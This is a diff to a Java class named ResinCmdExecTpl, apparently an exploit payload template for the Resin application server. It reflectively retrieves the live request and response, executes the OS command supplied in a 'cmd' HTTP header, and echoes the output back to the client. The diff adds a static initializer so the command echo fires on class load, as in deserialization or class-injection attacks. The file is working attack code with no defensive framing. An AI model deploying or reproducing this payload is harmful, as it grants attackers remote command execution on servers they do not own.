@@ -7,11 +7,18 @@ import java.lang.reflect.Method;
 import java.util.Scanner;
 
 public class ResinCmdExecTpl {
+    static {
+        try {
+            new ResinCmdExecTpl();
+        } catch (Exception e) {
+        }
+    }
+
     private String getReqHeaderName() {
         return "cmd";
     }
 
-    public ResinCmdExecTpl(){
+    public ResinCmdExecTpl() {
         run();
     }
 
@@ -19,25 +26,25 @@ public class ResinCmdExecTpl {
         try {
             Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);
             Field _responseF;
-            if(currentRequest.getClass().getName().contains("com.caucho.server.http.HttpRequest")){
+            if (currentRequest.getClass().getName().contains("com.caucho.server.http.HttpRequest")) {
                 // 3.x 需要从父类中获取
                 _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response");
-            }else{
+            } else {
                 _responseF = currentRequest.getClass().getDeclaredField("_response");
             }
             _responseF.setAccessible(true);
             Object response = _responseF.get(currentRequest);
             Method getWriterM = response.getClass().getMethod("getWriter");
-            Writer writer = (Writer)getWriterM.invoke(response);
+            Writer writer = (Writer) getWriterM.invoke(response);
             Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
-            String cmd = (String)getHeaderM.invoke(currentRequest, getReqHeaderName());
+            String cmd = (String) getHeaderM.invoke(currentRequest, getReqHeaderName());
             writer.write(exec(cmd));
-        }catch (Exception e){
+        } catch (Exception e) {
 
         }
     }
 
-    private String exec(String cmd){
+    private String exec(String cmd) {
         try {
             boolean isLinux = true;
             String osType = System.getProperty("os.name");
@@ -53,7 +60,7 @@ public class ResinCmdExecTpl {
                 execRes += s.next();
             }
             return execRes;
-        }catch (Exception e){
+        } catch (Exception e) {
             return e.getMessage();
         }
     }
